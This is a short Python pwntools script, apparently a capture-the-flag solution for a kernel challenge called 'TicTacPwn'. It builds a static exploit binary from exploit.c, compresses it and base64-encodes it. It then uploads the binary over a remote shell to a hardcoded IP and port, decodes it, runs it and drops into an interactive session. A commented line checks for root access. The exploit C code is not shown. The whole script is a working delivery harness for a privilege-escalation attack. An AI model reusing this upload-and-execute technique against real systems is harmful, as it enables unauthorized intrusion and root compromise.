#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os


context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('musl-gcc -static -masm=intel -O2 /home/k4fr/TicTacPwn/exploit.c -o /home/k4fr/TicTacPwn/exploit')
    os.system('strip /home/k4fr/TicTacPwn/exploit')
    os.system('gzip -c /home/k4fr/TicTacPwn/exploit > /home/k4fr/TicTacPwn/exploit.gz')
    r.sendlineafter(cmd, 'cd /home/user')
    r.sendlineafter(cmd, 'cat <<EOF > exploit.gz.b64')
    r.sendline((read('/home/k4fr/TicTacPwn/exploit.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exploit.gz.b64 > exploit.gz')
    r.sendlineafter(cmd, 'gunzip ./exploit.gz')
    r.sendlineafter(cmd, 'chmod +x ./exploit')
    r.sendlineafter(cmd, './exploit')
#    r.sendlineafter(cmd, 'id && whoami && cd /root && echo *')
    r.interactive()


#p = process('./startvm.sh', shell=True)
p = remote('159.65.49.148',31874)
exploit(p)

